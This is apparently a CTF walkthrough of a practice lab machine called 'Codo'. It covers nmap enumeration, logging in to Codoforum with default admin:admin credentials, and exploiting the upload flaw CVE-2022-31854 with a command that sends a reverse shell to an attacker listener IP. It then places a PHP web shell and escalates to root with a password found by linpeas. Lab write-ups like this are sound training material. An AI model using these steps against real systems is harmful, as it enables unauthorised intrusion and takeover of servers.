# **Codo** | PG Practice

***
## Part 2 of Mid Year CTF machines

## Released on: Jun 16, 2023
## Walkthrough: Yes

***

Running our nmap scan we have

```
# Nmap 7.94SVN scan initiated Mon Feb 26 18:58:16 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.153.23
Nmap scan report for 192.168.153.23
Host is up (0.17s latency).
Not shown: 65533 filtered tcp ports (no-response)
Bug in http-generator: no string output.
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: All topics | CODOLOGIC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 26 19:00:58 2024 -- 1 IP address (1 host up) scanned in 162.31 seconds
```

Navigating to port 80/HTTP we have this **Codoforum** web page



![](https://i.imgur.com/TpzkWA4.png)


However there is an information disclosure of the username on this page know as **admin**


```markdown
Hi,

This is an example post in your codoforum installation.  
You can create/modify/delete all forum categories from the forum backend.

Please edit the forum title and description from the backend.

The only user available to login in the front-end is **admin** with the password that you set during the installation..........
```


trying out default credentials on the logon page, we where able to login as user **admin** with password **admin** also



![](https://i.imgur.com/Lyj7ah1.png)

Navigating to the profile edit section of this page, we are able to upload an image


![](https://i.imgur.com/4rBfd90.png)


However uploading a `shell.php` file we get this error message



![](https://i.imgur.com/phq7Qpp.png)


After several uploads found an exploit for this on `CVE-2022-31854`, which you can download from [here](https://github.com/Vikaran101/CVE-2022-31854)



![](https://i.imgur.com/oC4GpU5.png)


Running the exploit i get a **Connection refused** error, :p, as we can see the connection is made to `/admin/?page=login` endpoint, for some reasons, things are not working

```bash
python3 exploit.py --target-url 'http://192.168.153.23' --username admin --password admin --listener-ip 192.168.45.203 --port 4444 
```


![](https://i.imgur.com/bMEHppK.png)


Decided to run a directory bruteforce attack and found the `/admin` endpoint



![](https://i.imgur.com/mQFsrat.png)


Navigating there same username and password we used earlier worked!! `admin:admin`

![](https://i.imgur.com/5kDHp35.png)


According to the exploit, navigating to this directory, i saw another upload function `/admin/index.php?page=config`


![](https://i.imgur.com/N5orXIP.png)



Uploaded my `shell.php` file and according to the exploit navigated to `/sites/default/assets/img/attachments/shell.php` and truly i got my web shell, haha 🙃



![](https://i.imgur.com/bKCHWht.png)


Then got an actual shell on my listener as user `www-data`

![](https://i.imgur.com/GSer3yN.png)


Running `linpeas.sh` i found a password called `FatPanda123` 



![](https://i.imgur.com/KGSUAha.png)


Fortunately, this password didn't work for the user `offsec` but worked for the the user `root` 😎


![](https://i.imgur.com/CSY22KL.png)

GG


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>
